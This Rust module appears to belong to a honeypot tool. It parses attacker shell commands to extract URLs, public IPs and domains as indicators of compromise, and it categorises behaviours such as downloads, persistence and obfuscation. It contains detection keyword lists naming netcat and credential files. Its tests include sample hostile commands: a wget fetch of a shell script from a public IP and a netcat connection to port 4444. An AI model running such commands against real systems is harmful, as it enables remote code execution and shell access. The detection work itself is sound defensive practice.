//! IOC (Indicator of Compromise) extraction from honeypot shell commands.
//!
//! Parses attacker-typed commands to extract: remote IPs, domains, URLs.
//! Used to identify C2 servers, malware drop points, and exfil targets.

use std::collections::HashSet;

/// Extracted indicators from a set of attacker commands.
#[derive(Debug, Clone, Default)]
#[allow(dead_code)]
pub struct ExtractedIocs {
    /// Remote IPs seen in commands (wget, curl, ssh, nc, etc.)
    pub ips: Vec<String>,
    /// Domains/hostnames seen in commands.
    pub domains: Vec<String>,
    /// Full URLs seen in commands.
    pub urls: Vec<String>,
    /// Suspicious command categories observed.
    pub categories: Vec<String>,
}

impl ExtractedIocs {
    pub fn is_empty(&self) -> bool {
        self.ips.is_empty() && self.domains.is_empty() && self.urls.is_empty()
    }

    /// Format for Telegram (HTML, <= 10 items per category).
    pub fn format_telegram(&self) -> String {
        let mut parts = Vec::new();
        for url in self.urls.iter().take(10) {
            parts.push(format!("🔗 <code>{}</code>", escape_html(url)));
        }
        for ip in self.ips.iter().take(10) {
            parts.push(format!("🌐 <code>{ip}</code>"));
        }
        if parts.is_empty() {
            return String::new();
        }
        parts.join("\n")
    }

    /// Format for the dashboard (plain text list).
    pub fn format_list(&self) -> Vec<String> {
        let mut out = Vec::new();
        out.extend(self.urls.iter().take(10).cloned());
        out.extend(self.ips.iter().take(10).cloned());
        out
    }
}

fn escape_html(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
}

/// Extract IOCs from a list of attacker shell commands.
pub fn extract_from_commands(commands: &[String]) -> ExtractedIocs {
    let mut urls: HashSet<String> = HashSet::new();
    let mut ips: HashSet<String> = HashSet::new();
    let mut domains: HashSet<String> = HashSet::new();
    let mut categories: HashSet<String> = HashSet::new();

    // Simple URL extraction: look for http:// or https:// prefixes
    // and collect non-whitespace characters that follow
    let url_prefix_re = regex::Regex::new(r#"https?://[^\s<>"']+"#).unwrap();

    // IP pattern
    let ip_re = regex::Regex::new(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b").unwrap();

    // Domain pattern (used after wget/curl/ssh/nc)
    let domain_re =
        regex::Regex::new(r"\b([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b")
            .unwrap();

    for cmd in commands {
        let lower = cmd.to_lowercase();

        // Categorize
        if lower.contains("wget") || lower.contains("curl") {
            categories.insert("download".to_string());
        }
        if lower.contains("crontab") || lower.contains("/etc/cron") {
            categories.insert("persistence".to_string());
        }
        if lower.contains("/etc/passwd")
            || lower.contains("/etc/shadow")
            || lower.contains("cat /etc")
        {
            categories.insert("enumeration".to_string());
        }
        if lower.contains("nc ") || lower.contains("ncat") || lower.contains("netcat") {
            categories.insert("network".to_string());
        }
        if lower.contains("chmod +x") || lower.contains("bash ") || lower.contains("sh ") {
            categories.insert("execution".to_string());
        }
        if lower.contains("ssh-keygen") || lower.contains("authorized_keys") {
            categories.insert("persistence".to_string());
        }
        if lower.contains("base64") || lower.contains("python -c") || lower.contains("perl -e") {
            categories.insert("obfuscation".to_string());
        }

        // Extract URLs first (most specific)
        for m in url_prefix_re.find_iter(cmd) {
            urls.insert(m.as_str().trim_end_matches(['.', '/', ',']).to_string());
        }

        // Extract bare IPs (skip loopback/private for IOC purposes)
        for cap in ip_re.captures_iter(cmd) {
            let ip = cap[1].to_string();
            if !is_private_ip(&ip) {
                ips.insert(ip);
            }
        }

        // Extract domains from wget/curl/ssh arguments
        if lower.contains("wget ") || lower.contains("curl ") || lower.contains("ssh ") {
            for m in domain_re.find_iter(cmd) {
                let d = m.as_str().to_lowercase();
                // Skip common system domains
                if !d.ends_with(".local") && d != "localhost" && !d.starts_with("example.") {
                    domains.insert(d);
                }
            }
        }
    }

    // Remove domains that are already covered by URLs
    let url_domains: HashSet<String> = urls
        .iter()
        .filter_map(|u| {
            u.split("://")
                .nth(1)
                .and_then(|rest| rest.split('/').next())
                .map(|h| h.split(':').next().unwrap_or(h).to_lowercase())
        })
        .collect();

    ExtractedIocs {
        urls: {
            let mut v: Vec<_> = urls.into_iter().collect();
            v.sort();
            v
        },
        ips: {
            let mut v: Vec<_> = ips.into_iter().collect();
            v.sort();
            v
        },
        domains: {
            let mut v: Vec<_> = domains
                .iter()
                .filter(|d| !url_domains.contains(*d))
                .cloned()
                .collect();
            v.sort();
            v
        },
        categories: {
            let mut v: Vec<_> = categories.into_iter().collect();
            v.sort();
            v
        },
    }
}

fn is_private_ip(ip: &str) -> bool {
    let parts: Vec<u8> = ip.split('.').filter_map(|p| p.parse().ok()).collect();
    if parts.len() != 4 {
        return false;
    }
    matches!(
        (parts[0], parts[1]),
        (10, _) | (127, _) | (172, 16..=31) | (192, 168)
    ) || parts[0] == 0
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extract_wget_url() {
        let cmds = vec!["wget http://45.33.32.156/shell.sh".to_string()];
        let iocs = extract_from_commands(&cmds);
        assert!(iocs.urls.iter().any(|u| u.contains("45.33.32.156")));
        assert!(iocs.categories.contains(&"download".to_string()));
    }

    #[test]
    fn extract_bare_ip() {
        let cmds = vec!["nc 185.220.101.45 4444".to_string()];
        let iocs = extract_from_commands(&cmds);
        assert!(iocs.ips.contains(&"185.220.101.45".to_string()));
        assert!(iocs.categories.contains(&"network".to_string()));
    }

    #[test]
    fn skip_private_ips() {
        let cmds = vec!["ssh 192.168.1.1".to_string()];
        let iocs = extract_from_commands(&cmds);
        assert!(!iocs.ips.contains(&"192.168.1.1".to_string()));
    }

    #[test]
    fn empty_commands_yields_empty_iocs() {
        let iocs = extract_from_commands(&[]);
        assert!(iocs.is_empty());
    }

    #[test]
    fn crontab_categorized_as_persistence() {
        let cmds = vec!["crontab -e".to_string()];
        let iocs = extract_from_commands(&cmds);
        assert!(iocs.categories.contains(&"persistence".to_string()));
    }
}
